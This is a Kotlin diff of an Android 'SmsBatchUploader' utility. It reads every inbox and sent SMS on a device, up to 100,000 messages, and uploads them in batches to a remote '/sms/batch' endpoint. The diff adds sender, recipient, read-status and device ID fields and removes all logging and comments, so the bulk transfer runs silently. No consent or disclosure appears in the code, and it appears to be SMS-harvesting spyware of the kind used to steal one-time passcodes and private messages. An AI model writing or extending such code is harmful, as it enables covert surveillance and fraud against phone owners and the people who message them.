@@ -2,7 +2,6 @@ package com.example.test.utils
 
 import android.content.Context
 import android.provider.Telephony
-import android.util.Log
 import kotlinx.coroutines.*
 import org.json.JSONArray
 import org.json.JSONObject
@@ -12,17 +11,14 @@ import java.net.URL
 
 object SmsBatchUploader {
 
-    private const val TAG = "SmsBatchUploader"
-
-    // ===================== تنظیمات (مثل Flutter) =====================
-    private const val BATCH_SIZE = 200                  // تعداد SMS در هر batch
-    private const val FETCH_CHUNK_SIZE = 2000           // تعداد SMS برای fetch در هر بار
-    private const val MAX_SAFE_SMS_COUNT = 100000       // حداکثر تعداد SMS
-    private const val RETRY_ATTEMPTS = 3                // تعداد تلاش مجدد
-    private const val DELAY_BETWEEN_BATCHES_MS = 300L   // تاخیر بین batch ها
-    private const val DELAY_BETWEEN_CHUNKS_MS = 1000L   // تاخیر بین chunk ها
-    private const val PROCESSING_DELAY_MS = 50L         // تاخیر در حین پردازش
-    private const val CHUNK_SIZE = 500                  // اندازه chunk برای پردازش
+    private const val BATCH_SIZE = 200
+    private const val FETCH_CHUNK_SIZE = 2000
+    private const val MAX_SAFE_SMS_COUNT = 100000
+    private const val RETRY_ATTEMPTS = 3
+    private const val DELAY_BETWEEN_BATCHES_MS = 300L
+    private const val DELAY_BETWEEN_CHUNKS_MS = 1000L
+    private const val PROCESSING_DELAY_MS = 50L
+    private const val CHUNK_SIZE = 500
 
     private var isCancelled = false
     private var isUploading = false
@@ -35,27 +31,18 @@ object SmsBatchUploader {
         limit: Int = 50
     ): UploadResult = withContext(Dispatchers.IO) {
         try {
-            Log.d(TAG, "⚡ Quick SMS upload started (limit: $limit)")
-
-            val messages = mutableListOf<SmsModel>()
-
-
-            val inboxMessages = fetchSmsFromBox(
+            val messages = fetchSmsFromBox(
                 context = context,
+                deviceId = deviceId,
                 box = Telephony.Sms.Inbox.CONTENT_URI,
                 type = "inbox",
                 limit = limit
             )
-            messages.addAll(inboxMessages)
 
             if (messages.isEmpty()) {
-                Log.w(TAG, "⚠️ No SMS found")
                 return@withContext UploadResult.Success(0, 0, 0)
             }
 
-            Log.d(TAG, "📊 Quick upload: ${messages.size} messages")
-
-            // ارسال یکباره (چون تعداد کمه)
             val success = sendBatch(
                 messages = messages,
                 deviceId = deviceId,
@@ -64,22 +51,16 @@ object SmsBatchUploader {
             )
 
             if (success) {
-                Log.d(TAG, "✅ Quick upload completed")
                 UploadResult.Success(messages.size, 0, 0)
             } else {
-                Log.e(TAG, "❌ Quick upload failed")
                 UploadResult.Failure("Quick upload failed")
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Quick upload error: ${e.message}", e)
             UploadResult.Failure(e.message ?: "Unknown error")
         }
     }
 
-    /**
-     * 📦 آپلود کامل تمام SMS ها با Batch Processing
-     */
     suspend fun uploadAllSms(
         context: Context,
         deviceId: String,
@@ -88,7 +69,6 @@ object SmsBatchUploader {
     ): UploadResult = withContext(Dispatchers.IO) {
 
         if (isUploading) {
-            Log.w(TAG, "⚠️ Upload already in progress")
             return@withContext UploadResult.Failure("Upload already in progress")
         }
 
@@ -96,29 +76,17 @@ object SmsBatchUploader {
         isCancelled = false
 
         try {
-            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-            Log.d(TAG, "🚀 SMS BATCH UPLOAD STARTED")
-            Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-
-            // شمارش کل
             onProgress?.invoke(UploadProgress.Counting("Counting messages..."))
             val totalCount = countTotalSms(context)
 
             if (totalCount == 0) {
-                Log.w(TAG, "⚠️ No SMS found")
                 return@withContext UploadResult.Success(0, 0, 0)
             }
 
             val safeCount = minOf(totalCount, MAX_SAFE_SMS_COUNT)
 
-            Log.d(TAG, "📊 Total SMS: $totalCount")
-            Log.d(TAG, "📊 Processing: $safeCount")
-            Log.d(TAG, "📦 Batch size: $BATCH_SIZE")
-            Log.d(TAG, "📦 Estimated batches: ${(safeCount / BATCH_SIZE) + 1}")
-
             onProgress?.invoke(UploadProgress.Processing(safeCount, 0, "Starting upload..."))
 
-            // پردازش
             val result = processAllMessages(
                 context = context,
                 deviceId = deviceId,
@@ -129,24 +97,14 @@ object SmsBatchUploader {
 
             when (result) {
                 is UploadResult.Success -> {
-                    Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-                    Log.d(TAG, "✅ UPLOAD COMPLETED")
-                    Log.d(TAG, "   Sent: ${result.totalSent}")
-                    Log.d(TAG, "   Skipped: ${result.totalSkipped}")
-                    Log.d(TAG, "   Failed: ${result.totalFailed}")
-                    Log.d(TAG, "━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━")
-
                     onProgress?.invoke(UploadProgress.Completed(safeCount, "Upload completed"))
                 }
-                is UploadResult.Failure -> {
-                    Log.e(TAG, "❌ Upload failed: ${result.error}")
-                }
+                is UploadResult.Failure -> {}
             }
 
             result
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ FATAL ERROR: ${e.message}", e)
             onProgress?.invoke(UploadProgress.Failed("Upload failed: ${e.message}"))
             UploadResult.Failure(e.message ?: "Unknown error")
 
@@ -155,9 +113,6 @@ object SmsBatchUploader {
         }
     }
 
-    /**
-     * 🔄 پردازش تمام پیامک‌ها با Chunk + Batch
-     */
     private suspend fun processAllMessages(
         context: Context,
         deviceId: String,
@@ -170,9 +125,6 @@ object SmsBatchUploader {
         var totalSkipped = 0
         var totalFailed = 0
 
-        // ===================== پردازش INBOX =====================
-        Log.d(TAG, "📥 Processing INBOX messages...")
-
         var inboxOffset = 0
         var hasMoreInbox = true
 
@@ -180,10 +132,9 @@ object SmsBatchUploader {
             val remainingCount = maxCount - inboxOffset
             val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)
 
-            Log.d(TAG, "📥 Fetching inbox chunk: offset=$inboxOffset, count=$fetchCount")
-
             val inboxChunk = fetchSmsChunk(
                 context = context,
+                deviceId = deviceId,
                 box = Telephony.Sms.Inbox.CONTENT_URI,
                 type = "inbox",
                 offset = inboxOffset,
@@ -215,12 +166,7 @@ object SmsBatchUploader {
             }
         }
 
-        Log.d(TAG, "✅ Inbox done: sent=$totalSent, skipped=$totalSkipped")
-
-        // ===================== پردازش SENT =====================
         if (!isCancelled && inboxOffset < maxCount) {
-            Log.d(TAG, "📤 Processing SENT messages...")
-
             var sentOffset = 0
             var hasMoreSent = true
             val remainingSlots = maxCount - inboxOffset
@@ -229,10 +175,9 @@ object SmsBatchUploader {
                 val remainingCount = remainingSlots - sentOffset
                 val fetchCount = minOf(remainingCount, FETCH_CHUNK_SIZE)
 
-                Log.d(TAG, "📤 Fetching sent chunk: offset=$sentOffset, count=$fetchCount")
-
                 val sentChunk = fetchSmsChunk(
                     context = context,
+                    deviceId = deviceId,
                     box = Telephony.Sms.Sent.CONTENT_URI,
                     type = "sent",
                     offset = sentOffset,
@@ -263,16 +208,11 @@ object SmsBatchUploader {
                     delay(DELAY_BETWEEN_CHUNKS_MS)
                 }
             }
-
-            Log.d(TAG, "✅ Sent done")
         }
 
         UploadResult.Success(totalSent, totalSkipped, totalFailed)
     }
 
-    /**
-     * 📦 پردازش یک Chunk از پیامک‌ها
-     */
     private suspend fun processChunk(
         messages: List<SmsModel>,
         deviceId: String,
@@ -303,7 +243,6 @@ object SmsBatchUploader {
                 currentProgress = startIndex + end
             )
 
-            // ارسال با Retry
             var success = false
             var attempts = 0
 
@@ -311,36 +250,27 @@ object SmsBatchUploader {
                 attempts++
 
                 try {
-                    Log.d(TAG, "📤 Sending batch ${batchInfo.batchNumber}/${batchInfo.totalBatches} " +
-                            "(${batch.size} messages) - Attempt $attempts")
-
                     success = withTimeout(10000L) {
                         sendBatch(batch, deviceId, baseUrl, batchInfo)
                     }
 
-                    if (success) {
-                        sent += batch.size
-                        Log.d(TAG, "✅ Batch ${batchInfo.batchNumber} sent successfully")
-                    } else {
-                        Log.w(TAG, "⚠️ Batch ${batchInfo.batchNumber} failed, retrying...")
+                    if (!success && attempts < RETRY_ATTEMPTS) {
                         delay(500L * attempts)
                     }
 
                 } catch (e: Exception) {
-                    Log.e(TAG, "❌ Batch ${batchInfo.batchNumber} error (attempt $attempts): ${e.message}")
-
                     if (attempts < RETRY_ATTEMPTS) {
                         delay(500L * attempts)
                     }
                 }
             }
 
-            if (!success) {
+            if (success) {
+                sent += batch.size
+            } else {
                 failed += batch.size
-                Log.e(TAG, "❌ Batch ${batchInfo.batchNumber} failed after $RETRY_ATTEMPTS attempts")
             }
 
-            // آپدیت Progress
             val progress = ((batchInfo.currentProgress.toFloat() / totalCount) * 100).toInt()
             onProgress?.invoke(
                 UploadProgress.Processing(
@@ -350,12 +280,10 @@ object SmsBatchUploader {
                 )
             )
 
-            // تاخیر بین batch ها
             if (batchIndex < totalBatches - 1 && !isCancelled) {
                 delay(DELAY_BETWEEN_BATCHES_MS)
             }
 
-            // Memory check
             if (batchIndex % 10 == 0) {
                 delay(100)
             }
@@ -364,9 +292,6 @@ object SmsBatchUploader {
         ChunkResult(sent, skipped, failed)
     }
 
-    /**
-     * 📡 ارسال یک Batch به سرور
-     */
     private suspend fun sendBatch(
         messages: List<SmsModel>,
         deviceId: String,
@@ -375,42 +300,42 @@ object SmsBatchUploader {
     ): Boolean = withContext(Dispatchers.IO) {
         try {
             val messagesArray = JSONArray()
+            val currentTime = System.currentTimeMillis()
+
             messages.forEach { sms ->
                 messagesArray.put(JSONObject().apply {
-                    put("from", sms.address)
+                    put("sms_id", sms.smsId)
+                    put("device_id", deviceId)
+                    put("from", sms.from)
+                    put("to", sms.to)
                     put("body", sms.body)
                     put("timestamp", sms.timestamp)
                     put("type", sms.type)
+                    put("is_read", sms.isRead)
+                    put("received_at", currentTime)
                 })
             }
 
             val json = JSONObject().apply {
                 put("device_id", deviceId)
-                put("messages", messagesArray)
+                put("data", messagesArray)
                 put("batch_info", JSONObject().apply {
                     put("batch", batchInfo.batchNumber)
                     put("of", batchInfo.totalBatches)
-                    put("batch_size", batchInfo.batchSize)
-                    put("total", batchInfo.totalMessages)
-                    put("progress", batchInfo.currentProgress)
                 })
-                put("timestamp", System.currentTimeMillis())
             }
 
             val response = sendPostRequest("$baseUrl/sms/batch", json.toString())
             response != null
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Send batch error: ${e.message}", e)
             false
         }
     }
 
-    /**
-     * 📥 خواندن SMS از یک Box خاص
-     */
     private fun fetchSmsFromBox(
         context: Context,
+        deviceId: String,
         box: android.net.Uri,
         type: String,
         limit: Int
@@ -421,9 +346,11 @@ object SmsBatchUploader {
             val cursor = context.contentResolver.query(
                 box,
                 arrayOf(
+                    Telephony.Sms._ID,
                     Telephony.Sms.ADDRESS,
                     Telephony.Sms.BODY,
-                    Telephony.Sms.DATE
+                    Telephony.Sms.DATE,
+                    Telephony.Sms.READ
                 ),
                 null,
                 null,
@@ -431,18 +358,39 @@ object SmsBatchUploader {
             )
 
             cursor?.use {
+                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                 val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                 val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                 val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
+                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
 
                 while (it.moveToNext()) {
                     try {
+                        val id = it.getLong(idIndex)
                         val address = it.getString(addressIndex)
                         val body = it.getString(bodyIndex)
                         val date = it.getLong(dateIndex)
+                        val isRead = it.getInt(readIndex) == 1
 
                         if (!address.isNullOrBlank() && body != null) {
-                            messages.add(SmsModel(address.trim(), body, date, type))
+                            val (from, to) = if (type == "inbox") {
+                                address.trim() to ""
+                            } else {
+                                "" to address.trim()
+                            }
+
+                            messages.add(
+                                SmsModel(
+                                    smsId = "${deviceId}_sms_${id}",
+                                    deviceId = deviceId,
+                                    from = from,
+                                    to = to,
+                                    body = body,
+                                    timestamp = date,
+                                    type = type,
+                                    isRead = isRead
+                                )
+                            )
                         }
                     } catch (e: Exception) {
                         continue
@@ -451,17 +399,14 @@ object SmsBatchUploader {
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Fetch SMS error: ${e.message}", e)
         }
 
         return messages
     }
 
-    /**
-     * 📥 خواندن یک Chunk از SMS با offset
-     */
     private fun fetchSmsChunk(
         context: Context,
+        deviceId: String,
         box: android.net.Uri,
         type: String,
         offset: Int,
@@ -473,9 +418,11 @@ object SmsBatchUploader {
             val cursor = context.contentResolver.query(
                 box,
                 arrayOf(
+                    Telephony.Sms._ID,
                     Telephony.Sms.ADDRESS,
                     Telephony.Sms.BODY,
-                    Telephony.Sms.DATE
+                    Telephony.Sms.DATE,
+                    Telephony.Sms.READ
                 ),
                 null,
                 null,
@@ -483,58 +430,60 @@ object SmsBatchUploader {
             )
 
             cursor?.use {
+                val idIndex = it.getColumnIndex(Telephony.Sms._ID)
                 val addressIndex = it.getColumnIndex(Telephony.Sms.ADDRESS)
                 val bodyIndex = it.getColumnIndex(Telephony.Sms.BODY)
                 val dateIndex = it.getColumnIndex(Telephony.Sms.DATE)
+                val readIndex = it.getColumnIndex(Telephony.Sms.READ)
 
                 var processed = 0
-                var skipped = 0
 
                 while (it.moveToNext()) {
                     try {
+                        val id = it.getLong(idIndex)
                         val address = it.getString(addressIndex)
                         val body = it.getString(bodyIndex)
                         val date = it.getLong(dateIndex)
+                        val isRead = it.getInt(readIndex) == 1
 
-                        if (address.isNullOrBlank()) {
-                            skipped++
-                            continue
+                        if (address.isNullOrBlank() || body == null) continue
+
+                        val (from, to) = if (type == "inbox") {
+                            address.trim() to ""
+                        } else {
+                            "" to address.trim()
                         }
 
-                        if (body == null) {
-                            skipped++
-                            continue
-                        }
-
-                        messages.add(SmsModel(address.trim(), body, date, type))
+                        messages.add(
+                            SmsModel(
+                                smsId = "${deviceId}_sms_${id}",
+                                deviceId = deviceId,
+                                from = from,
+                                to = to,
+                                body = body,
+                                timestamp = date,
+                                type = type,
+                                isRead = isRead
+                            )
+                        )
                         processed++
 
-                        // کمی تاخیر برای Memory
                         if (processed % CHUNK_SIZE == 0) {
                             Thread.sleep(PROCESSING_DELAY_MS)
                         }
 
                     } catch (e: Exception) {
-                        skipped++
                         continue
                     }
-                }
-
-                if (skipped > 0) {
-                    Log.d(TAG, "   Processed: $processed, Skipped: $skipped")
                 }
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Fetch chunk error: ${e.message}", e)
         }
 
         return messages
     }
 
-    /**
-     * 🔢 شمارش تعداد کل SMS
-     */
     private fun countTotalSms(context: Context): Int {
         return try {
             var inboxCount = 0
@@ -559,14 +508,10 @@ object SmsBatchUploader {
             inboxCount + sentCount
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ Count SMS error: ${e.message}", e)
             0
         }
     }
 
-    /**
-     * 📡 ارسال درخواست POST
-     */
     private fun sendPostRequest(urlString: String, jsonData: String): String? {
         var connection: HttpURLConnection? = null
         return try {
@@ -590,33 +535,29 @@ object SmsBatchUploader {
             if (responseCode == HttpURLConnection.HTTP_OK) {
                 connection.inputStream.bufferedReader().use { it.readText() }
             } else {
-                Log.w(TAG, "⚠️ Response code: $responseCode")
                 null
             }
 
         } catch (e: Exception) {
-            Log.e(TAG, "❌ HTTP request failed: ${e.message}", e)
             null
         } finally {
             connection?.disconnect()
         }
     }
 
-    /**
-     * 🛑 لغو آپلود
-     */
     fun cancelUpload() {
-        Log.d(TAG, "🛑 Upload cancellation requested")
         isCancelled = true
     }
 
-    // ===================== مدل‌های داده =====================
-
     data class SmsModel(
-        val address: String,
+        val smsId: String,
+        val deviceId: String,
+        val from: String,
+        val to: String,
         val body: String,
         val timestamp: Long,
-        val type: String
+        val type: String,
+        val isRead: Boolean
     )
 
     data class BatchInfo(
